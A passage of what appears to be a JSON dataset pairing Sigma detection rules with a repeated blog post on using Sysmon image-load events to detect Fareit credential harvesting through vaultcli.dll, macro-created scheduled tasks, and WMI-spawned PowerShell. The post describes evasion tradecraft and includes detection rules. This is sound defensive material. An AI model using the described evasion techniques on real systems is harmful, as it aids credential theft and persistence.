C:\\Windows\\SysWOW64\\vaultcli.dll\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Credential Vault Client Library\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=8395B530CAB0415DAFE8B01B2A7342866C6F45E1,MD5=33F761B3487238BEEEE5577C3E089CE7,SHA256=325E4DDAF3F45B4B540A98E05FB6A6F036A6955875F303D833E7A7644EB939DC,IMPHASH=8721D7F174531C1C4F8942462C87C899\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can write an Event Query Language (EQL) query to detect unexpected processes loading `vaultcli.dll` as follows. If you’re not familiar with EQL, you can find the getting started guide here.\n\n## Example 2: Stealthy Scheduled Task Creation via VBA Macro\n\nA Microsoft Office document can contain VBA code to create a scheduled task for persistence without using the native scheduled tasks (`schtasks.exe`) utility. A sample that exhibited this behavior was recently documented here.\n\nMany defenders have logging and alerting in place to detect suspicious usage of `schtasks.exe`. The following sample would bypass this detection, which is why I found it interesting.\n\nIf we open the malicious Excel document with Process Monitor running, we can see that `excel.exe` loads `taskschd.dll` (File Description: `Task Scheduler COM API`). Unless you have VBA macro-enabled Office documents in your environment that create or modify Windows scheduled tasks, this behavior should not occur often.\n\n```image\nAlt: Process Monitor output showing excel.exe loading taskschd.dll\nDescription: The image displays the output from Process Monitor capturing an event where `excel.exe` successfully loads the `taskschd.dll` file, which is part of the Task Scheduler COM API in Windows. The event details include the date and time of the operation (8/5/2019 at 7:25:43 PM), the thread number (2212), the operation type ('Load Image'), the result ('SUCCESS'), and the file path for the loaded image (`C:\\\\Windows\\System32\\taskschd.dll`). Additionally, it shows the image base and size, indicating that this is a technical log relevant to detecting suspicious behavior in Microsoft Office applications.\nTranscription: |\n  Event Properties\n  \n  Event:\n  Date: 8/5/2019 7:25:43.4163713 PM\n  Thread: 2212\n  Class: Process\n  Operation: Load Image\n  Result: SUCCESS\n  Path: C:\\Windows\\System32\\taskschd.dll\n  Duration: 0.0000000\n  Image Base: 0x7fefa2b0000\n  Image Size: 0x127000\n```\n\nThe following `Image Loaded` event was captured by Sysmon showing that `taskschd.dll` was loaded by `excel.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-05 19:39:51.293\nProcessGuid: {6F8FEDE1-85F8-5D48-0000-0010DADC5401}\nProcessId: 4832\nImage: C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Task Scheduler COM API\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskschd.dll\nHashes: SHA1=6F5A626EFF54C33FDC8C9E3D7EA44677CA0818DA,MD5=BAAFAF9CEAEC0B73C2A3550A01F6CECB,SHA256=018CB95A43CEA2063EA24691C71D51EF60D522C21502ABA8AD93876363D4B857,IMPHASH=21BCC6496DD1370029F85F9F7A29B9FB\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can detect the behavior of Microsoft Office applications loading `taskschd.dll` with the following EQL query.\n\n## Example 3: WMI Execution via VBA Macro\n\nAn adversary may include a malicious macro in a Microsoft Office document to execute commands via Windows Management Instrumentation (WMI). The motive behind this behavior is to evade detections that rely on process relationships.\n\nA common detection for security operations teams is to look for suspicious child processes of Microsoft Office applications, such as `cmd.exe` or `powershell.exe`. Below is an EQL query to detect this behavior. The list of process names is not exhaustive.\n\nBy invoking WMI to execute a malicious `powershell.exe` command, `powershell.exe` is spawned with the parent process `wmiprvse.exe`, not `winword.exe` or whatever application is used to execute the macro.\n\n```image\nAlt: Process Monitor output showing powershell.exe with the parent process wmiprvse.exe\nDescription: The image displays output from a Process Monitor tool, showing a list of running processes on a Windows system. It highlights the `powershell.exe` process, which is indicated as being spawned by `wmiprvse.exe`, a WMI Provider Host. This output is relevant to the context of detecting malicious activity involving Windows Management Instrumentation (WMI) through a VBA macro in Microsoft Office. The list includes other processes like `services.exe`, `svchost.exe`, and `Conhost.exe`, along with their respective descriptions and image paths, contributing to the analysis of process relationships used by adversaries.\nTranscription: |\n  Only show processes still running at end of current trace\n  Timelines cover displayed events only\n  \n  Process                          Image Path\n  services.exe (776)               C:\\WINDOWS\\system32\\services.exe\n  svchost.exe (964)                C:\\WINDOWS\\system32\\svchost.exe\n  DllHost.exe (6756)               C:\\WINDOWS\\system32\\DllHost.exe\n  RuntimeBroker.exe (6116)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7172)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7796)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  wmiprvse.exe (1608)              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n      powershell.exe (8880)        C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Conhost.exe (7740)               C:\\WINDOWS\\system32\\conhost.exe\n  backgroundTaskHost.exe (4896)    C:\\WINDOWS\\system32\\backgroundTaskHost.exe\n```\n\nWe can detect this suspicious behavior with the following EQL query:\n\n---\n\nWe have covered what image load event logging is, how to enable it using Sysmon, and some practical examples of how it can be used to detect evasive attempts to steal credentials, establish persistence, or execute malicious code.\n\nWhat adversary tradecraft can you detect by leveraging image load event logging or by combining these events with other event types such as process, network, or file events? I’d be interested in hearing any feedback, experiences, or findings that you would like to share. For anyone who would like to share any analytics for detection, please see the EQL Analytics Library contribution guide.",
    "sigma_rule": {
      "title": "CLR DLL Loaded Via Office Applications",
      "id": "d13c43f0-f66b-4279-8b2c-5912077c1780",
      "status": "test",
      "description": "Detects CLR DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-29",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\outlook.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|contains": "\\clr.dll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dotnet_clr_dll_load.yml",
    "id": "15"
  },
  {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL\n\nWhile examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules.\n\nI don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts.\n\n## What is an Image Load Event?\n\nA Windows process can load a dynamic link library (DLL) in order to use one or more of the DLL’s functions to carry out certain actions. For example, `notepad.exe` loads the DLL, `kernel32.dll` before it can use the CreateFileW function or API call to create or open files. This is an image load event.\n\n```image\nAlt: The imports table of notepad.exe shows that it imports CreateFileW from kernel32.dll\nDescription: The image displays the imports table for the Windows application 'notepad.exe' using the Pestudio tool. It lists various functions that 'notepad.exe' imports from dynamic link libraries (DLLs), specifically highlighting the 'CreateFileW' function imported from 'kernel32.dll'. The table shows additional columns for symbols, blacklisted status, anonymity, anti-debugging status, and the libraries from which these functions are imported. This information is pertinent for analyzing the executables and understanding how adversaries might leverage DLL imports for malicious activities.\nTranscription: |\n  | symbol (274)        | blacklisted | anonymous | anti-debug | library (29)       |\n  | ------------------- | ----------- | --------- | ---------- | ------------------ |\n  | CreateFileMappingW  | -           | -         | -          | kernel32.dll       |\n  | CreateFileW         | -           | -         | -          | kernel32.dll       |\n  | CreateFontIndirectW | -           | -         | -          | gdi32.dll          |\n  | CreateMutexExW      | -           | -         | -          | api-ms-win-core... |\n  | CreateSemaphoreExW  | -           | -         | -          | api-ms-win-core... |\n  | CreateStatusWindowW | -           | -         | -          | comctl32.dll       |\n  | CreateWindowExW     | -           | -         | -          | user32.dll         |\n  | DefWindowProcW      | -           | -         | -          | user32.dll         |\n  | DeleteDC            | -           | -         | -          | gdi32.dll          |\n  | DeleteFileW         | -           | -         | -          | kernel32.dll       |\n```\n\nImporting functions from existing DLLs means that developers don’t have to write their own code to have their software perform tasks such as writing or deleting files, creating additional processes, or handling network connections. “The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space.”\n\nAs you’ll see in the following examples, an adversary may write their malicious code to import functions from Windows or 3rd party software DLLs in order to help them achieve their objectives such as stealing passwords from or establishing persistence on their victim’s endpoint.\n\n## Configuring Image Load Event Logging\n\nMicrosoft Sysmon can be configured to log `Image Loaded` events to provide visibility into what DLLs are loaded by running processes.\n\n```image\nAlt: Description of Sysmon Event ID 7\nDescription: The image illustrates Sysmon Event ID 7, which pertains to 'Image Loaded' events. It visually summarizes the critical details of an event where a process (in this case, notepad.exe) loads a DLL (kernel32.dll). The image includes a structured format showing UtcTime, ProcessId, Image path, Loaded Image path, file version, description, product name, company, hash values (SHA1, MD5, SHA256, IMPHASH), and signature information. This data is essential for monitoring and detecting suspicious module loading behavior in a system.\nTranscription: |\n  Event ID 7: Image loaded\n  The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the –l option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a large number of events.\n```\n\nRoberto Rodriguez’s (@Cyb3rWard0g) Sysmon configuration file will capture the above Event ID.\n\nExecute the following command to install Sysmon and apply a configuration file.\n\n```\nsysmon.exe -i -c .\\config_file.xml\n```\n\nYou can review Sysmon events in Event Viewer under `Microsoft-Windows-Sysmon/Operational`. Below is an example `Image Loaded` event. As you can see, the process `notepad.exe` loaded `kernel32.dll`. Sysmon collects other useful information such as the hashes and signer information for the image that was loaded.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 13:59:40.739\nProcessGuid: {0AD3E319-E4CC-5D46-0000-0010A1A06A00}\nProcessId: 4132\nImage: C:\\Windows\\System32\\notepad.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=6EE3E2D33012161659609DADEA59A2164C5A5CEB,MD5=6955067712F2F4752CA12192B08EF860,SHA256=E02A3B57EA8B393408FF782866A1D342DD8C6B5F5925BA527981DBB21B6A4080,IMPHASH=3CE0779E0F4E275CD51A359A98CCC682\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nLet’s look at some examples of suspicious module loading behavior and how you can detect it.\n\n## Example 1: Malware Harvesting Credentials from Windows Credential Manager\n\nWindows Credential Manager allows you to create, view, or delete your saved credentials for signing in to websites, connected applications, and networks. An adversary may attempt to list or dump credentials stored in the Credential Manager.\n\nWhen the built-in `vaultcmd.exe` command line utility is used to list or manage stored credentials, this process loads the `vaultcli.dll` module. This is behavior is normal.\n\n```image\nAlt: Process Monitor output shows vaultcli.dll loaded by vaultcmd.exe\nDescription: The image displays a screenshot from Process Monitor, showing various entries related to the `vaultcli.dll` module. It includes timestamps, process names (e.g., `VaultCmd.exe`), process IDs, operations performed (like `CreateFile`), the path to the DLL, the result of each operation (all marked as 'SUCCESS'), and additional detail about the desired access (Read Attributes and Read Data/List). This output is relevant to detecting malicious activities involving credential management.\nTranscription: |\n  Time of Day          Process Name     PID   Operation     Path                                 Result   Detail\n  10:37:05.9901803 AM VaultCmd.exe      772   CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Attributes,\n  10:33:04.5633819 AM VaultCmd.exe      2056  CloseFile     C:\\Windows\\System32\\vaultcli.dll     SUCCESS \n  10:33:04.5634521 AM VaultCmd.exe      2056  CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Data/List\n```\n\nExamining the exports table of `vaultcli.dll` suggests that this DLL provides the functionality to enumerate or get information from the credential vault.\n\n```image\nAlt: Reviewing the exports table of vaultcli.dll\nDescription: The image shows a screenshot from Pestudio, a malware analysis tool, displaying information about the 'vaultcli.dll' file located in the Windows SysWOW64 directory. The interface lists various components of the DLL, including indicators, sections, libraries, imports, and exports. Specifically, it highlights the exports section, detailing function names related to the Credential Vault Client Library, including 'VaultRemoveItem', 'VaultOpenVault', and 'VaultEnumerateItems'. This information is relevant for understanding how the 'vaultcli.dll' can be manipulated by malware authors to harvest credentials.\nTranscription: |\n  pestudio 8.56 - Malware Initial Assessment - www.winitor.com\n  File: c:\\windows\\syswow64\\vaultcli.dll\n  \n  indicators (10)\n    virustotal (n/a)\n    dos-stub (184 bytes)\n    file-header (20 bytes)\n    optional-header (224 bytes)\n    directories (15)\n    sections (6)\n    libraries (34)\n    imports (195)\n    exports (anonymous)\n  \n  index    name (17)                  address\n  124      VaultRemoveItem            0x00000000\n  123      VaultOpenVault             0x00000000\n  122      VaultGetItemType           0x00000000\n  121      VaultGetItem               0x00000000\n  120      VaultGetInformation        0x00000000\n  119      VaultFree                  0x00000000\n  118      VaultFindItems             0x00000000\n  117      VaultEnumerateVaults       0x00000000\n  116      VaultEnumerateItems        0x00000000\n  115      VaultEnumerateItemTypes    0x00000000\n  114      VaultDeleteItemType        0x00000000\n```\n\nSome malware authors abuse the functions provided by the Credential Vault Client Library (`vaultcli.dll`) by importing its functionality to enumerate or harvest saved credentials.\n\nThe screenshot below from Process Hacker shows that Fareit malware loaded the `vaultcli.dll` module.\n\n```image\nAlt: Credential Vault Client Library (vaultcli.dll) DLL loaded by Fareit malware\nDescription: The image displays the properties window of the process 'fareit.exe' (PID 4516) in Windows. The window includes details under various tabs such as General, Memory, Environment, and Modules. Notably, it shows the list of loaded modules, with 'vaultcli.dll' highlighted, indicating its base address, size, and description as 'Credential Vault Client Library'. This detail is relevant for analyzing the behavior of the 'fareit' malware in relation to credential harvesting.\nTranscription: |\n  fareit.exe (4516) Properties\n  ------------------------------------------------------------------------------\n  | Name            | Base address | Size    | Description                     |\n  | --------------- | ------------ | ------- | ------------------------------- |\n  | ws2_32.dll      | 0x76a60000   | 396 kB  | Windows Socket 2.0 32-Bit DLL   |\n  | wow64win.dll    | 0x6fe40000   | 476 kB  | Wow64 Console and Win32 ...     |\n  | wow64cpu.dll    | 0x6ff20000   | 40 kB   | AMD64 Wow64 CPU                 |\n  | wow64.dll       | 0x6fec0000   | 328 kB  | Win32 Emulation on NT64         |\n  | WinTypes.dll    | 0x70ab0000   | 828 kB  | Windows Base Types DLL          |\n  | windows.stor... | 0x74110000   | 5.43 MB | Microsoft WinRT Storage API     |\n  | win32u.dll      | 0x746d0000   |         | Win32                           |\n  | vaultcli.dll    | 0x70b80000   | 216 kB  | Credential Vault Client Library |\n  | userenv.dll     | 0x73a20000   |         | Userenv                         |\n  | user32.dll      | 0x7c340000   |         | Multi-User Windows USER A       |\n  ------------------------------------------------------------------------------\n```\n\nThe following `Image Loaded` event was captured by Sysmon and shows that `vaultcli.dll` was loaded by `fareit.exe`, not `vaultcmd.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 14:15:42.301\nProcessGuid: {0AD3E319-E88D-5D46-0000-001097C2A500}\nProcessId: 4516\nImage: C:\\Users\\Roxy\\Downloads\\fareit.exe\nImageLoaded: C:\\Windows\\SysWOW64\\vaultcli.dll\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Credential Vault Client Library\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=8395B530CAB0415DAFE8B01B2A7342866C6F45E1,MD5=33F761B3487238BEEEE5577C3E089CE7,SHA256=325E4DDAF3F45B4B540A98E05FB6A6F036A6955875F303D833E7A7644EB939DC,IMPHASH=8721D7F174531C1C4F8942462C87C899\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can write an Event Query Language (EQL) query to detect unexpected processes loading `vaultcli.dll` as follows. If you’re not familiar with EQL, you can find the getting started guide here.\n\n## Example 2: Stealthy Scheduled Task Creation via VBA Macro\n\nA Microsoft Office document can contain VBA code to create a scheduled task for persistence without using the native scheduled tasks (`schtasks.exe`) utility. A sample that exhibited this behavior was recently documented here.\n\nMany defenders have logging and alerting in place to detect suspicious usage of `schtasks.exe`. The following sample would bypass this detection, which is why I found it interesting.\n\nIf we open the malicious Excel document with Process Monitor running, we can see that `excel.exe` loads `taskschd.dll` (File Description: `Task Scheduler COM API`). Unless you have VBA macro-enabled Office documents in your environment that create or modify Windows scheduled tasks, this behavior should not occur often.\n\n```image\nAlt: Process Monitor output showing excel.exe loading taskschd.dll\nDescription: The image displays the output from Process Monitor capturing an event where `excel.exe` successfully loads the `taskschd.dll` file, which is part of the Task Scheduler COM API in Windows. The event details include the date and time of the operation (8/5/2019 at 7:25:43 PM), the thread number (2212), the operation type ('Load Image'), the result ('SUCCESS'), and the file path for the loaded image (`C:\\\\Windows\\System32\\taskschd.dll`). Additionally, it shows the image base and size, indicating that this is a technical log relevant to detecting suspicious behavior in Microsoft Office applications.\nTranscription: |\n  Event Properties\n  \n  Event:\n  Date: 8/5/2019 7:25:43.4163713 PM\n  Thread: 2212\n  Class: Process\n  Operation: Load Image\n  Result: SUCCESS\n  Path: C:\\Windows\\System32\\taskschd.dll\n  Duration: 0.0000000\n  Image Base: 0x7fefa2b0000\n  Image Size: 0x127000\n```\n\nThe following `Image Loaded` event was captured by Sysmon showing that `taskschd.dll` was loaded by `excel.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-05 19:39:51.293\nProcessGuid: {6F8FEDE1-85F8-5D48-0000-0010DADC5401}\nProcessId: 4832\nImage: C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Task Scheduler COM API\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskschd.dll\nHashes: SHA1=6F5A626EFF54C33FDC8C9E3D7EA44677CA0818DA,MD5=BAAFAF9CEAEC0B73C2A3550A01F6CECB,SHA256=018CB95A43CEA2063EA24691C71D51EF60D522C21502ABA8AD93876363D4B857,IMPHASH=21BCC6496DD1370029F85F9F7A29B9FB\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can detect the behavior of Microsoft Office applications loading `taskschd.dll` with the following EQL query.\n\n## Example 3: WMI Execution via VBA Macro\n\nAn adversary may include a malicious macro in a Microsoft Office document to execute commands via Windows Management Instrumentation (WMI). The motive behind this behavior is to evade detections that rely on process relationships.\n\nA common detection for security operations teams is to look for suspicious child processes of Microsoft Office applications, such as `cmd.exe` or `powershell.exe`. Below is an EQL query to detect this behavior. The list of process names is not exhaustive.\n\nBy invoking WMI to execute a malicious `powershell.exe` command, `powershell.exe` is spawned with the parent process `wmiprvse.exe`, not `winword.exe` or whatever application is used to execute the macro.\n\n```image\nAlt: Process Monitor output showing powershell.exe with the parent process wmiprvse.exe\nDescription: The image displays output from a Process Monitor tool, showing a list of running processes on a Windows system. It highlights the `powershell.exe` process, which is indicated as being spawned by `wmiprvse.exe`, a WMI Provider Host. This output is relevant to the context of detecting malicious activity involving Windows Management Instrumentation (WMI) through a VBA macro in Microsoft Office. The list includes other processes like `services.exe`, `svchost.exe`, and `Conhost.exe`, along with their respective descriptions and image paths, contributing to the analysis of process relationships used by adversaries.\nTranscription: |\n  Only show processes still running at end of current trace\n  Timelines cover displayed events only\n  \n  Process                          Image Path\n  services.exe (776)               C:\\WINDOWS\\system32\\services.exe\n  svchost.exe (964)                C:\\WINDOWS\\system32\\svchost.exe\n  DllHost.exe (6756)               C:\\WINDOWS\\system32\\DllHost.exe\n  RuntimeBroker.exe (6116)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7172)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7796)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  wmiprvse.exe (1608)              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n      powershell.exe (8880)        C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Conhost.exe (7740)               C:\\WINDOWS\\system32\\conhost.exe\n  backgroundTaskHost.exe (4896)    C:\\WINDOWS\\system32\\backgroundTaskHost.exe\n```\n\nWe can detect this suspicious behavior with the following EQL query:\n\n---\n\nWe have covered what image load event logging is, how to enable it using Sysmon, and some practical examples of how it can be used to detect evasive attempts to steal credentials, establish persistence, or execute malicious code.\n\nWhat adversary tradecraft can you detect by leveraging image load event logging or by combining these events with other event types such as process, network, or file events? I’d be interested in hearing any feedback, experiences, or findings that you would like to share. For anyone who would like to share any analytics for detection, please see the EQL Analytics Library contribution guide.",
    "sigma_rule": {
      "title": "GAC DLL Loaded Via Office Applications",
      "id": "90217a70-13fc-48e4-b3db-0d836c5824ac",
      "status": "test",
      "description": "Detects any GAC DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-02-10",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|startswith": "C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate macro usage. Add the appropriate filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dotnet_gac_dll_load.yml",
    "id": "16"
  },
  {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL\n\nWhile examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules.\n\nI don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts.\n\n## What is an Image Load Event?\n\nA Windows process can load a dynamic link library (DLL) in order to use one or more of the DLL’s functions to carry out certain actions. For example, `notepad.exe` loads the DLL, `kernel32.dll` before it can use the CreateFileW function or API call to create or open files. This is an image load event.\n\n```image\nAlt: The imports table of notepad.exe shows that it imports CreateFileW from kernel32.dll\nDescription: The image displays the imports table for the Windows application 'notepad.exe' using the Pestudio tool. It lists various functions that 'notepad.exe' imports from dynamic link libraries (DLLs), specifically highlighting the 'CreateFileW' function imported from 'kernel32.dll'. The table shows additional columns for symbols, blacklisted status, anonymity, anti-debugging status, and the libraries from which these functions are imported. This information is pertinent for analyzing the executables and understanding how adversaries might leverage DLL imports for malicious activities.\nTranscription: |\n  | symbol (274)        | blacklisted | anonymous | anti-debug | library (29)       |\n  | ------------------- | ----------- | --------- | ---------- | ------------------ |\n  | CreateFileMappingW  | -           | -         | -          | kernel32.dll       |\n  | CreateFileW         | -           | -         | -          | kernel32.dll       |\n  | CreateFontIndirectW | -           | -         | -          | gdi32.dll          |\n  | CreateMutexExW      | -           | -         | -          | api-ms-win-core... |\n  | CreateSemaphoreExW  | -           | -         | -          | api-ms-win-core... |\n  | CreateStatusWindowW | -           | -         | -          | comctl32.dll       |\n  | CreateWindowExW     | -           | -         | -          | user32.dll         |\n  | DefWindowProcW      | -           | -         | -          | user32.dll         |\n  | DeleteDC            | -           | -         | -          | gdi32.dll          |\n  | DeleteFileW         | -           | -         | -          | kernel32.dll       |\n```\n\nImporting functions from existing DLLs means that developers don’t have to write their own code to have their software perform tasks such as writing or deleting files, creating additional processes, or handling network connections. “The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space.”\n\nAs you’ll see in the following examples, an adversary may write their malicious code to import functions from Windows or 3rd party software DLLs in order to help them achieve their objectives such as stealing passwords from or establishing persistence on their victim’s endpoint.\n\n## Configuring Image Load Event Logging\n\nMicrosoft Sysmon can be configured to log `Image Loaded` events to provide visibility into what DLLs are loaded by running processes.\n\n```image\nAlt: Description of Sysmon Event ID 7\nDescription: The image illustrates Sysmon Event ID 7, which pertains to 'Image Loaded' events. It visually summarizes the critical details of an event where a process (in this case, notepad.exe) loads a DLL (kernel32.dll). The image includes a structured format showing UtcTime, ProcessId, Image path, Loaded Image path, file version, description, product name, company, hash values (SHA1, MD5, SHA256, IMPHASH), and signature information. This data is essential for monitoring and detecting suspicious module loading behavior in a system.\nTranscription: |\n  Event ID 7: Image loaded\n  The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the –l option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a large number of events.\n```\n\nRoberto Rodriguez’s (@Cyb3rWard0g) Sysmon configuration file will capture the above Event ID.\n\nExecute the following command to install Sysmon and apply a configuration file.\n\n```\nsysmon.exe -i -c .\\config_file.xml\n```\n\nYou can review Sysmon events in Event Viewer under `Microsoft-Windows-Sysmon/Operational`. Below is an example `Image Loaded` event. As you can see, the process `notepad.exe` loaded `kernel32.dll`. Sysmon collects other useful information such as the hashes and signer information for the image that was loaded.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 13:59:40.739\nProcessGuid: {0AD3E319-E4CC-5D46-0000-0010A1A06A00}\nProcessId: 4132\nImage: C:\\Windows\\System32\\notepad.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=6EE3E2D33012161659609DADEA59A2164C5A5CEB,MD5=6955067712F2F4752CA12192B08EF860,SHA256=E02A3B57EA8B393408FF782866A1D342DD8C6B5F5925BA527981DBB21B6A4080,IMPHASH=3CE0779E0F4E275CD51A359A98CCC682\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nLet’s look at some examples of suspicious module loading behavior and how you can detect it.\n\n## Example 1: Malware Harvesting Credentials from Windows Credential Manager\n\nWindows Credential Manager allows you to create, view, or delete your saved credentials for signing in to websites, connected applications, and networks. An adversary may attempt to list or dump credentials stored in the Credential Manager.\n\nWhen the built-in `vaultcmd.exe` command line utility is used to list or manage stored credentials, this process loads the `vaultcli.dll` module. This is behavior is normal.\n\n```image\nAlt: Process Monitor output shows vaultcli.dll loaded by vaultcmd.exe\nDescription: The image displays a screenshot from Process Monitor, showing various entries related to the `vaultcli.dll` module. It includes timestamps, process names (e.g., `VaultCmd.exe`), process IDs, operations performed (like `CreateFile`), the path to the DLL, the result of each operation (all marked as 'SUCCESS'), and additional detail about the desired access (Read Attributes and Read Data/List). This output is relevant to detecting malicious activities involving credential management.\nTranscription: |\n  Time of Day          Process Name     PID   Operation     Path                                 Result   Detail\n  10:37:05.9901803 AM VaultCmd.exe      772   CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Attributes,\n  10:33:04.5633819 AM VaultCmd.exe      2056  CloseFile     C:\\Windows\\System32\\vaultcli.dll     SUCCESS \n  10:33:04.5634521 AM VaultCmd.exe      2056  CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Data/List\n```\n\nExamining the exports table of `vaultcli.dll` suggests that this DLL provides the functionality to enumerate or get information from the credential vault.\n\n```image\nAlt: Reviewing the exports table of vaultcli.dll\nDescription: The image shows a screenshot from Pestudio, a malware analysis tool, displaying information about the 'vaultcli.dll' file located in the Windows SysWOW64 directory. The interface lists various components of the DLL, including indicators, sections, libraries, imports, and exports. Specifically, it highlights the exports section, detailing function names related to the Credential Vault Client Library, including 'VaultRemoveItem', 'VaultOpenVault', and 'VaultEnumerateItems'. This information is relevant for understanding how the 'vaultcli.dll' can be manipulated by malware authors to harvest credentials.\nTranscription: |\n  pestudio 8.56 - Malware Initial Assessment - www.winitor.com\n  File: c:\\windows\\syswow64\\vaultcli.dll\n  \n  indicators (10)\n    virustotal (n/a)\n    dos-stub (184 bytes)\n    file-header (20 bytes)\n    optional-header (224 bytes)\n    directories (15)\n    sections (6)\n    libraries (34)\n    imports (195)\n    exports (anonymous)\n  \n  index    name (17)                  address\n  124      VaultRemoveItem            0x00000000\n  123      VaultOpenVault             0x00000000\n  122      VaultGetItemType           0x00000000\n  121      VaultGetItem               0x00000000\n  120      VaultGetInformation        0x00000000\n  119      VaultFree                  0x00000000\n  118      VaultFindItems             0x00000000\n  117      VaultEnumerateVaults       0x00000000\n  116      VaultEnumerateItems        0x00000000\n  115      VaultEnumerateItemTypes    0x00000000\n  114      VaultDeleteItemType        0x00000000\n```\n\nSome malware authors abuse the functions provided by the Credential Vault Client Library (`vaultcli.dll`) by importing its 